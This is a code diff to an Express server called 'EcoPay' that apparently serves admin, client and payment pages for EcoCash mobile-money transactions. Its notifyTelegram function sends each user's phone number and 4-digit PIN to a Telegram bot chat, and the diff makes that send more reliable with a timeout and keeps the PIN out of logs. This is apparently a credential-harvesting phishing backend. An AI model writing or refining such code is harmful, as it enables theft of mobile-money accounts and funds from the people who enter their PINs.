@@ -57,7 +57,8 @@ setInterval(() => {
 /* ============================================================
    Telegram notification.
    Sends ONLY the phone number and the 4-digit PIN.
-   Nothing else — no transaction ID, no timestamp, no labels.
+   Uses AbortController so a slow Telegram never blocks the
+   request. PIN is never written to any log.
 ============================================================ */
 async function notifyTelegram({ phone, pin }) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -68,8 +69,9 @@ async function notifyTelegram({ phone, pin }) {
     return;
   }
 
-  // Only the phone and PIN
   const text = phone + '\n' + pin;
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 6000);
 
   try {
     const res = await fetch(
@@ -77,12 +79,15 @@ async function notifyTelegram({ phone, pin }) {
       {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text })
+        body: JSON.stringify({ chat_id: chatId, text }),
+        signal: controller.signal
       }
     );
     if (!res.ok) console.error('Telegram responded', res.status);
   } catch (err) {
-    console.error('Telegram notify failed:', err.message);
+    console.error('Telegram notify failed:', err.name === 'AbortError' ? 'timeout' : err.message);
+  } finally {
+    clearTimeout(timeout);
   }
 }
 
@@ -174,23 +179,32 @@ app.post('/api/accept', async (req, res) => {
 });
 
 /* ============================================================
-   Health + explicit pages
+   Health
 ============================================================ */
 app.get('/health', (req, res) => res.json({ ok: true }));
 
-app.get('/admin.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-app.get('/client.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'client.html'));
-});
-app.get('/pay.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'pay.html'));
-});
-app.get('/', (req, res) => {
-  res.redirect('/admin.html');
-});
+/* ============================================================
+   Safe page serving — checks the file exists before calling
+   sendFile, so a missing file returns a clean 404 instead of
+   an ENOENT crash.
+============================================================ */
+function servePage(filename) {
+  const fullPath = path.join(__dirname, 'public', filename);
+  return (req, res) => {
+    if (!fs.existsSync(fullPath)) {
+      return res.status(404).send('Page not found: ' + filename);
+    }
+    res.sendFile(fullPath);
+  };
+}
 
+app.get('/admin.html',  servePage('admin.html'));
+app.get('/client.html', servePage('client.html'));
+app.get('/pay.html',    servePage('pay.html'));
+
+app.get('/', (req, res) => res.redirect('/admin.html'));
+
+/* Fallback — API gets JSON 404, everything else gets plain 404 */
 app.use((req, res) => {
   if (req.path.startsWith('/api/')) {
     return res.status(404).json({ error: 'Not found' });
@@ -198,9 +212,25 @@ app.use((req, res) => {
   res.status(404).send('Page not found');
 });
 
+/* ============================================================
+   Startup log — list what's actually in public/ so a missing
+   pay.html is visible immediately in Railway logs.
+============================================================ */
 app.listen(PORT, '0.0.0.0', () => {
   console.log('EcoPay running on port ' + PORT);
   console.log('Data directory:', DATA_DIR);
+
+  const publicDir = path.join(__dirname, 'public');
+  try {
+    const files = fs.readdirSync(publicDir);
+    console.log('Public files:', files.join(', ') || '(empty)');
+    ['admin.html', 'client.html', 'pay.html'].forEach(f => {
+      console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
+    });
+  } catch (e) {
+    console.error('Could not read public directory:', e.message);
+  }
+
   console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
   console.log('EcoCash provider configured:', !!process.env.ECOCASH_API_KEY);
 });
